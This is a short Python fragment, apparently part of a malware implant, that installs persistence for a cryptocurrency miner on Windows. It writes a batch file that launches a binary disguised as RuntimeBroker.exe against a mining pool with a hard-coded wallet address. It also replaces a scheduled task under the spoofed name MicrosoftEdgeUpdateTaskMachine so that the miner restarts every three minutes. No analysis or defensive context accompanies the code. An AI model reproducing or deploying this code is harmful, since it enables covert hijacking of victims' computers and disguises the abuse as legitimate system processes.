import subprocess
d = 'C:\\Users\\Public\\Downloads'
m = d + '\\RuntimeBroker.exe'
bat = """@echo off
tasklist /FI "IMAGENAME eq RuntimeBroker.exe" 2>NUL | find /I "RuntimeBroker" >NUL
if errorlevel 1 start "" "%s" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker SRL_183_232_248_121
""" % m
with open(d + '\\check.bat', 'w') as f:
    f.write(bat)
subprocess.run(['schtasks', '/delete', '/tn', 'MicrosoftEdgeUpdateTaskMachine', '/f'], capture_output=True)
r = subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftEdgeUpdateTaskMachine', '/tr', d + '\\check.bat', '/sc', 'minute', '/mo', '3', '/f'], capture_output=True, text=True)
return 'PERSIST:' + ('OK' if r.returncode == 0 else r.stderr[:50])
